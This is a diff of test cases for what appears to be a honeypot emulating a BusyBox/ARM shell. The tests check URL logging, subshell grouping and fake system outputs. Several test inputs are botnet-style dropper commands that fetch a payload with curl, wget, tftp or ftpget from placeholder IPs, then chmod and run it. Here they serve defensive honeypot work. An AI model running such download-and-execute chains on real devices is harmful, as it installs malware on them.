@@ -305,6 +305,8 @@ test.case("shell: downloads log their URL") do
     {kind: "url", url: "tftp://5.6.7.8:69/mips", via: "tftp"}
   ])
   test.assert(string.starts_with(r.out, "Connecting to 1.2.3.4 (1.2.3.4:80)\nsaving to 'y'\n"))
+  test.assert(string.contains(run(sh, "wget -Oz http://1.2.3.4/x"), "saving to 'z'\n"))
+  test.assert(string.ends_with(run(sh, "wget http://1.2.3.4/x -O -"), "written to stdout\n"))
   r = shell.line(sh, "curl -s -o a http://h/c.sh | sh; /bin/busybox ftpget 9.9.9.9 b b.mips; tftp 7.7.7.7 -c get t.sh; wget -q")
   test.assert_eq(table.map(table.filter(r.events, fn(e) e.kind == "url" end), fn(e) e.url end), [
     "http://h/c.sh", "ftp://9.9.9.9/b.mips", "tftp://7.7.7.7/t.sh"
@@ -341,6 +343,63 @@ test.case("shell: command substitutions run") do
   test.assert_eq(run(sh, "echo $(echo $(echo $(echo $(echo $(echo deep)))))"), "$(echo deep)\n")
   test.assert_eq(run(sh, "echo $(exit) still"), " still\n")
   test.assert_eq(shell.closed(sh), nil)
+end
+
+test.case("parse: groups") do
+  let cmds = shell.parse("(a; b) > w; c && (d (e)) | (f")
+  test.assert_eq(table.map(cmds, fn(c) [c.group, c.words, c.op] end), [
+    ["a; b", [], ";"], [nil, ["c"], "&&"], ["d (e)", [], "|"], ["f", [], nil]
+  ])
+  test.assert(cmds[0].quiet)
+  test.assert_eq(shell.parse("echo (x) $(y)")[0].words, ["echo", "(x)", "$(y)"])
+  test.assert_eq(table.map(shell.parse("(echo ')' \"(\" \\)); x"), fn(c) [c.group, c.words] end), [
+    ["echo ')' \"(\" \\)", []], [nil, ["x"]]
+  ])
+  test.assert_eq(shell.parse("echo $(echo ')')")[0].words, ["echo", "$(echo ')')"])
+end
+
+test.case("shell: groups run in a subshell") do
+  let sh = logged_in_shell()
+  let r = shell.line(sh, "(wget http://9.8.7.6/wget -O- || busybox wget http://9.8.7.6/wget -O-) > w; chmod 777 w; ./w; rm -rf w")
+  test.assert_eq(table.filter(r.events, fn(e) e.kind == "url" end), [{kind: "url", url: "http://9.8.7.6/wget", via: "wget"}])
+  # wget's progress goes to stderr, which `> w` leaves alone.
+  test.assert(string.starts_with(r.out, "Connecting to 9.8.7.6 (9.8.7.6:80)\nwriting to stdout\n"))
+  test.assert(not string.contains(r.out, "not found"))
+  r = shell.line(sh, "(tftp -g 9.8.7.6 -r tftp -l- || busybox tftp -g 9.8.7.6 -r tftp -l-) > t; (ftpget 9.8.7.6 f ftpget) > f")
+  test.assert_eq(table.map(table.filter(r.events, fn(e) e.kind == "url" end), fn(e) e.url end), [
+    "tftp://9.8.7.6/tftp", "ftp://9.8.7.6/ftpget"
+  ])
+  test.assert_eq(run(sh, "(echo a; nope) 2>/dev/null; echo b"), "a\nb\n")
+  test.assert_eq(run(sh, "(false) || (echo c)"), "c\n")
+  test.assert_eq(run(sh, "((((echo four))))"), "four\n")
+  test.assert_eq(run(sh, "(((((echo five)))))"), "")
+  test.assert_eq(run(sh, "(exit); echo still"), "still\n")
+  test.assert_eq(shell.closed(sh), nil)
+end
+
+test.case("shell: binaries read as an ARM executable") do
+  let sh = logged_in_shell()
+  let exe = run(sh, "/bin/busybox cat /proc/self/exe || cat /proc/self/exe")
+  test.assert_eq(len(exe), 52 + 4 * 32)
+  test.assert_eq(substr(exe, 0, 4), chr(127) + "ELF")
+  # 32-bit, little-endian; e_machine 40 is ARM.
+  test.assert_eq([ord(exe, 4), ord(exe, 5), ord(exe, 18), ord(exe, 19)], [1, 1, 40, 0])
+  test.assert_eq(find(exe, "\n", 0), -1)
+  test.assert_eq(find(exe, "\r", 0), -1)
+  for path in ["/bin/busybox", "/bin/sh", "/bin/echo"]
+    test.assert_eq(run(sh, "cat {path}"), exe, path)
+  end
+end
+
+test.case("shell: ping, hostname and id") do
+  let sh = logged_in_shell()
+  test.assert(string.contains(run(sh, "ping; sh"), "Usage: ping [OPTIONS] HOST"))
+  test.assert_eq(run(sh, "ping -c 1 8.8.8.8 && echo up"), "PING 8.8.8.8 (8.8.8.8): 56 data bytes\nping: sendto: Network is unreachable\n")
+  test.assert_eq(run(sh, "hostname"), "localhost\n")
+  test.assert_eq(run(sh, "/bin/busybox hostname PBOC"), "")
+  test.assert_eq(run(sh, "hostname; uname -n; uname -m"), "PBOC\nPBOC\narmv7l\n")
+  test.assert_eq(run(sh, "id"), "uid=0(root) gid=0(root)\n")
+  test.assert_eq(run(sh, "busybox id"), "uid=0(root) gid=0(root)\n")
 end
 
 test.case("shell: exit ends the session") do
